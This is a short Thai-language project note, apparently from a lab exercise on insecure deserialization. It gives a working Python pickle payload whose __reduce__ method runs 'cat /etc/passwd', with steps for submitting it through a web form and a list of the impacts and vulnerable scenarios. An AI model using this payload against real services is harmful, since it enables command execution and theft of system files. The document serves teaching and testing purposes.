# Payloads

## Payload หลักที่ใช้ในโปรเจค

ใช้ Python pickle ร่วมกับเมธอด `__reduce__` เพื่อเรียกคำสั่งระบบ

ตัวอย่างโค้ด:

```python
import pickle
import base64
import subprocess

class Exploit:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/etc/passwd'],))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

เพื่อแสดงรายชื่อผู้ใช้ของระบบ

---

## ขั้นตอนการทดสอบ

1. รันไฟล์ payload.py เพื่อสร้าง payload
2. คัดลอกข้อความ base64 ที่ได้
3. นำไปวางในช่อง Serialized Data บนหน้าเว็บ
4. กด Submit
5. หน้าเว็บจะแสดงข้อมูลจากไฟล์ `/etc/passwd`

---

## ผลกระทบ

หากเกิดในระบบจริง อาจนำไปสู่

- อ่านไฟล์สำคัญ
- รันคำสั่งบนเซิร์ฟเวอร์
- ขโมยข้อมูล
- ยึดเครื่อง

---

## ตัวอย่างสถานการณ์

- เว็บรับ object จากผู้ใช้
- ระบบ backend deserialize ข้อมูลจาก service อื่น
- ไม่มีการตรวจสอบความถูกต้องของข้อมูล

ทั้งหมดนี้อาจนำไปสู่การยึดระบบได้
